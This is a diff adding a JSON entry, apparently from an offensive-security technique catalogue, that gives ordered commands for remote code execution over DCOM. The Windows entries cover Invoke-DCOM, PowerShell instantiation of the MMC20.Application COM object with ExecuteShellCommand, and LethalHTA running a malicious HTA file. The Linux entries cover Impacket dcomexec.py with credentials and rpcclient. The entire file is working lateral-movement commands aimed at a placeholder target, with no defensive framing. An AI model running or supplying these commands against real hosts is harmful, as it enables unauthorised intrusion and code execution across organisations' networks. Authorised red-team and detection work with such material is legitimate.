@@ -1,0 +1,92 @@
+{
+    "ExecuteDCOM": {
+        "meaning": "This can allow code execution under certain conditions by instantiating a COM object on a remote machine and invoking its methods.",
+        "common": "",
+        "windows": {
+            "InvokeDCOM": [
+                {
+                    "order": 1,
+                    "command": "Invoke-DCOM -ComputerName target.domain.com -Method MMC20.Application -Command \"calc.exe\"",
+                    "description": "Execute command using MMC20.Application COM object"
+                }
+            ],
+            "PowerShell_CLSID": [
+                {
+                    "order": 1,
+                    "command": "$ComputerName = \"target.domain.com\"",
+                    "description": "Set target computer name"
+                },
+                {
+                    "order": 2,
+                    "command": "$clsid = \"{fbae34e8-bf95-4da8-bf98-6c6e580aa348}\"",
+                    "description": "Set COM object CLSID"
+                },
+                {
+                    "order": 3,
+                    "command": "$Type = [Type]::GetTypeFromCLSID($clsid, $ComputerName)",
+                    "description": "Get COM object type from CLSID"
+                },
+                {
+                    "order": 4,
+                    "command": "$ComObject = [Activator]::CreateInstance($Type)",
+                    "description": "Create COM object instance on remote machine"
+                }
+            ],
+            "PowerShell_ProgID": [
+                {
+                    "order": 1,
+                    "command": "$ComputerName = \"target.domain.com\"",
+                    "description": "Set target computer name"
+                },
+                {
+                    "order": 2,
+                    "command": "$ProgId = \"MMC20.Application\"",
+                    "description": "Set COM object ProgID"
+                },
+                {
+                    "order": 3,
+                    "command": "$Type = [Type]::GetTypeFromProgID($ProgId, $ComputerName)",
+                    "description": "Get COM object type from ProgID"
+                },
+                {
+                    "order": 4,
+                    "command": "$ComObject = [Activator]::CreateInstance($Type)",
+                    "description": "Create COM object instance"
+                },
+                {
+                    "order": 5,
+                    "command": "$ComObject.Document.ActiveView.ExecuteShellCommand(\"cmd.exe\", $null, \"/c calc.exe\", \"7\")",
+                    "description": "Execute shell command via COM object"
+                }
+            ],
+            "LethalHTA": [
+                {
+                    "order": 1,
+                    "command": "python LethalHTA.py --target target.domain.com --user domain\\user --password password --hta-file malicious.hta",
+                    "description": "Execute HTA file on remote machine using DCOM"
+                }
+            ]
+        },
+        "linux": {
+            "Impacket_DCOM": [
+                {
+                    "order": 1,
+                    "command": "dcomexec.py domain/user:password@target.domain.com \"calc.exe\"",
+                    "description": "Execute command using DCOM via Impacket"
+                }
+            ],
+            "Manual_RPC": [
+                {
+                    "order": 1,
+                    "command": "rpcclient -U 'domain\\user%password' target.domain.com",
+                    "description": "Connect to target using RPC client"
+                },
+                {
+                    "order": 2,
+                    "command": "# Manual DCOM manipulation via RPC calls (advanced)",
+                    "description": "Perform manual DCOM operations through RPC"
+                }
+            ]
+        }
+    }
+}
